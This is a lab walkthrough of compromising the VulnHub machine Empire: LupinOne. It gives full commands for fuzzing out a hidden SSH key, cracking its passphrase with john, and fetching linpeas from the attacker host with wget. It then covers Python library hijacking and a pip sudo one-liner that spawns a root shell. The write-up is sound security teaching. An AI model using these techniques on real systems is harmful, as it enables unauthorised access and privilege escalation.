@@ -1,0 +1,114 @@
+<style>:root{--bg-color:#121212;--text-color:#ffffff;--accent-red:#ff4d4d;--accent-purple:#bb86fc;--secondary-color:#03dac6;--card-bg:#1e1e1e;--code-bg:#2d2d2d;--border-color:#333}body{background-color:var(--bg-color);color:var(--text-color);font-family:"Segoe UI",Roboto,Oxygen,Ubuntu,Cantarell,"Open Sans","Helvetica Neue",sans-serif;line-height:1.6;margin:0;padding:20px;max-width:1200px;margin:0 auto}.post-content{background-color:var(--card-bg);border-radius:8px;padding:30px;box-shadow:0 4px 6px rgba(0,0,0,0.3);margin-bottom:30px;color:var(--text-color) !important}h1,h2,h3,h4{color:var(--accent-purple);margin-top:1.5em}h3 span{color:var(--accent-red) !important}a{color:var(--secondary-color);text-decoration:none}a:hover{text-decoration:underline}pre,code{background-color:var(--code-bg);border-radius:4px;padding:2px 4px;font-family:Consolas,Monaco,"Andale Mono",monospace;color:#f8f8f2}pre{overflow-x:auto;padding:15px;border-left:3px solid var(--accent-purple)}img{max-width:100%;height:auto;display:block;margin:20px auto;border:1px solid var(--border-color)}ul,ol{padding-left:20px}li{margin-bottom:8px}.post-date,.post-cats{color:#aaa;font-size:0.9em;margin-bottom:20px}span,p{color:inherit !important}span[style*="color: #800000"]{color:var(--accent-red) !important}</style>
+<div class="post-content">
+            <div class="post-cats">
+                <span class="cat-links"><a href="https://www.hackingarticles.in/category/ctf-challenges/" rel="category tag">CTF Challenges</a>, <a href="https://www.hackingarticles.in/category/ctf-challenges/vulnhub/" rel="category tag">VulnHub</a></span>            </div>
+            <h1 class="post-title entry-title">Empire: LupinOne Vulnhub Walkthrough</h1>            <div class="post-date">
+                                    <div class="entry-meta">
+                        <span class="posted-on"><a href="https://www.hackingarticles.in/empire-lupinone-vulnhub-walkthrough/" rel="bookmark"><time class="entry-date published" datetime="2021-12-25T11:27:42+00:00">December 25, 2021</time><time class="updated" datetime="2025-07-07T17:25:08+00:00">July 7, 2025</time></a></span><span class="post_by"> by <span class="author vcard"><a class="url fn n" href="https://www.hackingarticles.in/author/raj/">Raj</a></span></span>                    </div><!-- .entry-meta -->
+                            </div>
+
+            <div class="content post-excerpt entry-content clearfix">
+                <p><span style="color: #000000;"><strong><a style="color: #000000;" href="https://www.vulnhub.com/entry/empire-lupinone,750/">Empire: LupinOne</a></strong> is a Vulnhub easy-medium machine designed by icex64 and Empire Cybersecurity. This lab is appropriate for seasoned CTF players who want to put their skills to the test. Enumeration is the key, so, let’s get started and figure out how to break things down into manageable pieces.</span></p>
+<h3><span style="color: #800000;">Pentesting Methodology</span></h3>
+<p><span style="color: #000000;"><strong>Network Scanning</strong></span></p>
+<ul>
+<li><span style="color: #000000;">netdiscover</span></li>
+<li><span style="color: #000000;">nmap</span></li>
+</ul>
+<p><span style="color: #000000;"><strong>Enumeration</strong></span></p>
+<ul>
+<li><span style="color: #000000;">abusing HTTP</span></li>
+<li><span style="color: #000000;">fuzzing</span></li>
+</ul>
+<p><span style="color: #000000;"><strong>Exploitation</strong></span></p>
+<ul>
+<li><span style="color: #000000;">john</span></li>
+<li><span style="color: #000000;">ssh</span></li>
+</ul>
+<p><span style="color: #000000;"><strong>Privilege Escalation</strong></span></p>
+<ul>
+<li><span style="color: #000000;">linpeas</span></li>
+<li><span style="color: #000000;">python library hijacking</span></li>
+<li><span style="color: #000000;">pip</span></li>
+<li><span style="color: #000000;">root flag</span></li>
+</ul>
+<p><span style="color: #000000;"><strong>Level: Easy-Medium</strong></span></p>
+<h3><span style="color: #800000;">Network Scanning</span></h3>
+<p><span style="color: #000000;">To begin, we must use the netdiscover command to scan the network for the IP address of the victim machine.</span></p>
+<p><span style="color: #000000;">To move forward in this process, we are launching Nmap.</span></p>
+<pre class="EnlighterJSRAW" data-enlighter-language="generic">nmap -sC -sV 192.168.1.2</pre>
+<p><span style="color: #000000;">We have, according to the nmap output:</span></p>
+<ul>
+<li><span style="color: #000000;">on port 22 there is an SSH server.</span></li>
+<li><span style="color: #000000;">an HTTP service (Apache Server) running on port 80, as well as a<strong> /~myfiles</strong></span></li>
+</ul>
+<p><span style="color: #000000;"><img decoding="async" src="https://blogger.googleusercontent.com/img/a/AVvXsEghBsP84_4xLRFQPdgiP6oO24gZ_1IR7PMzfcsRrITiADV56Gfup6xmiXSe-se5HEuoQ4nf5I5RpFQalh4YyAAZ0E7oYKTZMBi0rhwYCNDxJV4WOWI4NW1zCMvwxfHc9Jb_1T6QAjVJm8eqByS2DcK-aqAf0-HKuRpTgga8UvSUCGkAraCU7rpunLdZTQ=s16000"/></span></p>
+<h3><span style="color: #800000;">Enumeration</span></h3>
+<p><span style="color: #000000;">Firstly, we began the enumeration procedure by inspecting the <strong>(/~myfiles) </strong>HTTP page. Discovered an Error 404, which seemed suspicious.</span></p>
+<pre class="EnlighterJSRAW" data-enlighter-language="generic">http://192.168.1.2/~myfiles/</pre>
+<p><span style="color: #000000;"><img decoding="async" src="https://blogger.googleusercontent.com/img/a/AVvXsEhLH5sXCFOBNeJHgBJ1IDqH2OkfEhgvDFHcMSzswAgFMGG0K3Id-lUuF6wW0dJ77D7-GmFh-IOu8fVGnXuggRGIXWPsj7HEBhofU-ECTJKeQuGTAMBMKAQNw_9BEnJqCMq8w8AlhUdLwksXMzH6A4jO9lXeKhMk4EhHDLCqJQWOKuZiNNl6R4sZSCpxqA=s16000"/></span></p>
+<p><span style="color: #000000;">We looked at the view page source and found comment “you can do it, keep trying”.</span></p>
+<p><span style="color: #000000;"><img decoding="async" src="https://blogger.googleusercontent.com/img/a/AVvXsEhm6WdtreqzMmhBFuD-dtE9w_Iy6dysF3CBgsoY3jThLS7WAVaMV5C1dXAXbZY8-15m_4tpM7Bpr9QaNQC6AMHoR6RvjqdrGFAGBI4XN1AbVVo98pTwkQYt6WRGl0HmkVcrbPPo2bBtNaKams6iixIAesyheb37eOUfn1T6VMalL516NSKp2jhioHTBNQ=s16000"/></span></p>
+<p><span style="color: #000000;">As a result, we use fuzzing to gain some additional information from this case. We made use of <strong>ffuf </strong>and we obtained a directory (<strong>secret</strong>).</span></p>
+<pre class="EnlighterJSRAW" data-enlighter-language="generic">ffuf -c -w /usr/share/seclists/Discovery/Web-Content/common.txt -u 'http://192.168.1.2/~FUZZ'</pre>
+<p><span style="color: #000000;"><img decoding="async" src="https://blogger.googleusercontent.com/img/a/AVvXsEjZ6f7qCjVe9e0Iu-wk4oyPAf7M1z5mLsRpHoYLeMr5bvcZQ9RsqbNIM1KtqBtpdbIr3xVN3yezqeqSs6MtEgWBI7YI_R9CqFXxsYCXpoCZPXNv7Z9Yk9RnEB1l9-FGUJ3egsymxYxDLBq96Xg82Vorm0EKbmi-8bgw6CyCemDrD0oSH5kBwdPMhbSpMQ=s16000"/></span></p>
+<p><span style="color: #000000;">Take a good look at that secret directory and analyses that here author is sharing some information related to SSH private key file related to user “icex64” that we need to fuzz.</span></p>
+<p><span style="color: #000000;"><img decoding="async" src="https://blogger.googleusercontent.com/img/a/AVvXsEhwupkQdJHLd8xUCJJoRFZmijoRNwKZ9yKGILmhp3SMxS3uLODDooGt1E-LbenubOt0xpQxJiLS6bDbzadlyn2KE_kNqsjIJGMmDPD0R5U96ff2PaVNfmErzqgnewblm2eG6SeHxLqaRZ93KuadSoiOzHtcQklK23TyDwZRccjCWZqX6uGtZEMSGbblSQ=s16000"/></span></p>
+<p><span style="color: #000000;">To find that secret private ssh key, we again use fuzzing with the help of ffuf once more and found text file (<strong>mysecret.txt</strong>).</span></p>
+<pre class="EnlighterJSRAW" data-enlighter-language="generic">ffuf -c -ic -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -u 'http://192.168.1.2/~secret/.FUZZ' -fc 403 -e .txt,.html</pre>
+<p><span style="color: #000000;"><img decoding="async" src="https://blogger.googleusercontent.com/img/a/AVvXsEi5QbA5G3b6uOm9Ju_dfUZqgHd4c-U_-anbrMPMZ1bUbfSgiRLNaiGOuPovaYoCP9DONRdykY0QcCsNMLrh9aFlOHO6c9L0EcIdvyCyfUTkxKOePVw9330JbwtRxjMrpzqzpBOvOc9oLPVa9DaeiUTFisf7tu01IDM04OpwUezDEOYEhazqttnoSGke3w=s16000"/></span></p>
+<p><span style="color: #000000;">We explore mysecret.txt with a web browser. It appears to be a <strong>private ssh key</strong>, but it is encoded. We thoroughly examined this key and discovered that it is encoded in <strong>base 58</strong>.</span></p>
+<pre class="EnlighterJSRAW" data-enlighter-language="generic">http://192.168.1.2./~secret/.mysecret.txt</pre>
+<p><span style="color: #000000;"><img decoding="async" src="https://blogger.googleusercontent.com/img/a/AVvXsEg84s0NAW0DGep_GZ2JJJvPapD-bmiPfHN8kTqqXh_wAmQGvRDQeII8qZoPqxx8mhWAuzXCVUo1jofUynz5ycgCtNxTpXZM20ym3kQHfzGSif0GGQRoVcYdkpyRzMwJeT57U_JOi5JsAV6DVpmQPTILVtexiNoemQnGkaDTZo4Yy7fUI0LozCXc-iM5zg=s16000"/></span></p>
+<p><span style="color: #000000;">We looked up a base 58 decoder online and were met with <u><a style="color: #000000;" href="https://www.browserling.com/tools/base58-decode">browserling</a></u>. It is the most basic online base-58 decoder for web developers and programmers.</span></p>
+<p><span style="color: #000000;">Simply enter your data in the form below, click the Base-58 Decode button, and the system will provide you with a base-58 encoded string. We obtained our <strong>ssh-key</strong> after decoding it.</span></p>
+<p><span style="color: #000000;"><img decoding="async" src="https://blogger.googleusercontent.com/img/a/AVvXsEirLSLPT-MiFXVXnIT8_s8Gu2UFPds70YN2EK9G_VubFyxEjZlBAZ88eMW42NEJOjgv2Qli4P0ZX646gpwAq-VdHCEJ4JoIIFOqG3zLSVlGBLqpUDZOAVJMut_jOrZeVkty6qMC1y-GHXMWefCT92Ac_GhpQXz7nhhBdTj2Ahk2aPytPxzz-VtrD_vPNw=s16000"/></span></p>
+<h3><span style="color: #800000;">Exploitation</span></h3>
+<p><span style="color: #000000;">Since the author has share some hint related to passphrase for SSH Key, thus we are using ssh2john to obtain the hash value of the ssh-key.</span></p>
+<pre class="EnlighterJSRAW" data-enlighter-language="generic">locate ssh2john
+/usr/share/john/ssh2john.py sshkey &gt; hash</pre>
+<p><span style="color: #000000;">Now, use john to crack the hash value.</span></p>
+<pre class="EnlighterJSRAW" data-enlighter-language="generic">john --wordlist=/usr/share/wordlists/fastrack.txt hash</pre>
+<p><span style="color: #000000;">In a few seconds, Bingo!! We obtained the ssh-key password (<strong>P@55w0rd!</strong>).</span></p>
+<p><span style="color: #000000;"><img decoding="async" src="https://blogger.googleusercontent.com/img/a/AVvXsEijOCVSJJBUX0zThR9vVWf-CHaLS2IDwCbNxV1_TGmJZxtZ9o-iUO5jm335xNU_L4-IO6SLgp3B6-8x7NJ3SGm8ZQZvJIevj3mKJfUi7MxViUegItw48yvk-hGgmvJEfc-zAvwBglI1WhPyW9nQRPiWTyjl9yxO9F0T9b5SNuLyieUV_gDZPAxm1deJQA=s16000"/></span></p>
+<p><span style="color: #000000;">We have all of the requirements for ssh login. Use our icex64 username, ssh-key, and cracked password (<strong>P@55w0rd!</strong>).</span></p>
+<pre class="EnlighterJSRAW" data-enlighter-language="generic">ssh -i sshkey icex64@192.168.1.2</pre>
+<p><span style="color: #000000;">Bang!! To connect to SSH, we used the icex64 user. A Python file was running when we quickly confirmed this user’s access. We looked at that file right away and found that we could effectively exploit it using the Python Library Hijacking technique.</span></p>
+<pre class="EnlighterJSRAW" data-enlighter-language="generic">sudo -l
+cat /home/arsene/heist.py</pre>
+<p><span style="color: #000000;"><img decoding="async" src="https://blogger.googleusercontent.com/img/a/AVvXsEhBSCBNa0u9PentMJ8Pbp5k7XFzZRgb8GaiT0aurTrnrYY5udON_5DM6jhif3PVblPaNOXLmSnY4YEvhbuVQHloZx2jiWjeq8ml5C9p_it9hR9A2XxXUT-owiZ48T7pgvG59c7twyyW0TO29wwQ5bljWj_IGK8OV4rjouvcI_aUkkKHUgEtxG8Ax0kl-A=s16000"/></span></p>
+<h3><span style="color: #800000;">Privilege Escalation</span></h3>
+<p><span style="color: #000000;">We’ve started the process of escalating privileges. To begin with the Python Library Hijacking technique, we must first determine the coordinates of webbrowser.py. That’s why we’re employing the <strong>linpeas </strong>script.</span></p>
+<p><span style="color: #000000;">We’ve previously downloaded the Linpeas script from git <u><a style="color: #000000;" href="https://github.com/carlospolop/PEASS-ng/tree/master/linPEAS">page</a></u>. Now we just navigate to that directory and launch a basic Python http server.</span></p>
+<pre class="EnlighterJSRAW" data-enlighter-language="generic">python -m SimpleHTTPServer 80</pre>
+<p><span style="color: #000000;"><img decoding="async" src="https://blogger.googleusercontent.com/img/a/AVvXsEh4BQ2VQiDgk_lKM7b3S5thy9Z01nEia3j2cJIBpV58zUyvnJEbzhs9CZSgTAnsDz3V8sZZdtKWQBkehmzqh3W2xSVVXV_eyxTCjmWcOTw-WZx1AxUXJ30one7QR_kC4LUG4NEJuPMSH4KB17Q1g5i9f8ot8nidaxFqpubrdhnTpwxeGeY6rgpCVivqNQ=s16000"/></span></p>
+<p><span style="color: #000000;">Now we’ll switch to the icex64 terminal. We moved the directory to /tmp directory and imported the Linpeas script from Kali Linux using the wget function.</span></p>
+<pre class="EnlighterJSRAW" data-enlighter-language="generic">cd /tmp
+wget 192.168.1.3/linpeas.sh</pre>
+<p><span style="color: #000000;">Then we granted the script the ALL permissions. Then we ran it right away.</span></p>
+<pre class="EnlighterJSRAW" data-enlighter-language="generic">chmod 777 linpeas.sh
+./linpeas.sh</pre>
+<p><span style="color: #000000;"><img decoding="async" src="https://blogger.googleusercontent.com/img/a/AVvXsEiZQlBdUI6gxnU7VILl5Phw-avfYYgRqCZO0pYa1wDHpL_2Lk2CaAc49wRhXgonvbqDYIL-y3CZNqWmAKxHocWyYBmxYrFQpaGIuPJyXFDz1gio-5Mqi4Nxu64aey_0eq32iRcpdoNHwx1nyWxzPnfA1UNwe_JcOibNsZaw62t-NcISiAieqPUVWtvjdg=s16000"/></span></p>
+<p><span style="color: #000000;">We obtained the location of the Python file in a matter of seconds (<strong>webbrowser.py</strong>).</span></p>
+<p><span style="color: #000000;"><img decoding="async" src="https://blogger.googleusercontent.com/img/a/AVvXsEjXziEp5PBGXxWN_J-9E0TiFtYpBemHQsTCLgM86YOHKSGDLuarVj54lHDJrPHE7QymmDlTDDs7-1mYO1leBzd8Zm2cYioY6raHKDIBpxb3b632VvGcvXXbHaEvt_xhsOgzRtSQxpUmzhmQGqnK8fx1IwX4sYQQTE4x8w5D_cyhex7EDkCC33CiYXDfwA=s16000"/></span></p>
+<p><span style="color: #000000;">We can now begin our Python Library Hijacking procedure where we introduce an attacker into a python-enabled environment; you can learn more about this strategy by clicking <u><a style="color: #000000;" href="https://www.hackingarticles.in/linux-privilege-escalation-python-library-hijacking/">here</a></u>.</span></p>
+<p><span style="color: #000000;">To operate this python file, we utilised the nano command and edit the script to call /bin/bash code into it.</span></p>
+<pre class="EnlighterJSRAW" data-enlighter-language="generic">os.system ("/bin/bash")</pre>
+<p><span style="color: #000000;"><img decoding="async" src="https://blogger.googleusercontent.com/img/a/AVvXsEhWkjkHox5l5yd_Zqt2Sl3_TSbEVxr79z8AFGanQ8TOEuL47SZw6u1ZBIRBsfdkTgjFHcN7MKen2SAWX6h4BXvIZntIsh8ShuITk5zwmWN5MQg40Xqvi8PlW4mvqH7vHl5ily8_4GSzvFJkXgDA8BqzJE5D2O1uizwc_My8cripa58ZpLj42RHMyh3YHg=s16000"/></span></p>
+<p><span style="color: #000000;">After all of this effort, we ran the sudo command in conjunction with the coordinates specified in the permissions check on icex64. To switch the user <strong>icex64 </strong>to <strong>arsene</strong>.</span></p>
+<pre class="EnlighterJSRAW" data-enlighter-language="generic">sudo -u arsene /usr/bin/python3.9 /home/arsene/heist.py</pre>
+<p><span style="color: #000000;">Now that we got the user <strong>arsene </strong>and checked this user SUDO permissions and found user has privilege to execute pip binary as root without atuthentication. We have an idea to do <strong>pip </strong>privilege escalation after evaluating a few more moments.</span></p>
+<pre class="EnlighterJSRAW" data-enlighter-language="generic">sudo -l</pre>
+<p><span style="color: #000000;"><img decoding="async" src="https://blogger.googleusercontent.com/img/a/AVvXsEgvklUoad4JLXkXs14AoNBGI3Aswm0o-ZDYHuYXJRHJT90AMeyBkLS58O07ycTkzjTciLZ9CHnv4sQbMNAOMKH7vzQ1BKE2UBhhLZgelYLwqkRspcKv8ZfTwwvTH7Hk1bqfKyqRgh0aJL2khTuc3VwV5lSJFk5tUZ5_PlOEK3DUuI9v8p7zby5sbID9Xg=s16000"/></span></p>
+<h4><span style="color: #000000;">Root Access</span></h4>
+<p><span style="color: #000000;">We used the gtfobin instructions provided <u><a style="color: #000000;" href="https://gtfobins.github.io/gtfobins/pip/">here </a></u>to conduct pip privilege escalation. If the programme is allowed to run as superuser by sudo, it retains its elevated rights and can be used to access the file system, escalate, or keep privileged access.</span></p>
+<p><span style="color: #000000;">To conduct pip privilege escalation, we only need to run these three commands.</span></p>
+<pre class="EnlighterJSRAW" data-enlighter-language="generic">TF=$(mktemp -d)
+echo "import os; os.execl('/bin/sh', 'sh', '-c', 'sh &lt;$(tty) &gt;$(tty) 2&gt;$(tty)')" &gt; $TF/setup.py
+sudo pip install $TF</pre>
+<p><span style="color: #000000;">Yippee!! Finally, we have the root; simply use the id command to check. It has been proven that it is root; simply change the directory to root. Congo!! We obtained the root flag.</span></p>
+<p><span style="color: #000000;"><img decoding="async" src="https://blogger.googleusercontent.com/img/a/AVvXsEhlfEyBcD3Gw2y6qRNfp0GXBB40IpRAYpbLcK9zEYNeEgFSdZ4wNf3sQemPL4UFMedkZyXYKY5Z3XaREzYCAAxXzT-8CinoiokZsvJLY4A2qd3uD53euSQmU8Z1QRehpRMtsC2YpALZ0FEixOFUWOcqYA1ZEZVZyzGGBJsywyo5f5CT3no53Qb9I7EUfA=s16000"/></span></p>
+<p><span style="color: #000000;">This is how we’ll get at the machine’s shell. It was a terrific exercise, and it was a lot of fun to cheer for the winners. To comprehend many scenarios, it is required to try once.</span></p>
+<p><span style="color: #000000;">Thank you for giving your precious time to read this walkthrough. If you want to read more VulnHub Write-ups. Follow this</span> <strong><a href="https://www.hackingarticles.in/category/ctf-challenges/vulnhub/">Link.</a></strong> <span style="color: #000000;">Happy Hacking!</span></p>
+<p><span style="color: #000000;"><strong>Author</strong>: Shubham Sharma is a passionate Cybersecurity Researcher, contact <span style="color: #0000ff;"><strong><u><a style="color: #0000ff;" href="https://www.linkedin.com/in/shubham-sharma-626964153/">LinkedIn</a></u></strong> </span>and <span style="color: #0000ff;"><strong><u><a style="color: #0000ff;" href="https://twitter.com/Shubham_pen">Twitter</a></u></strong></span>.</span></p>
+<div class="yarpp yarpp-related yarpp-related-website yarpp-template-thumbnails">
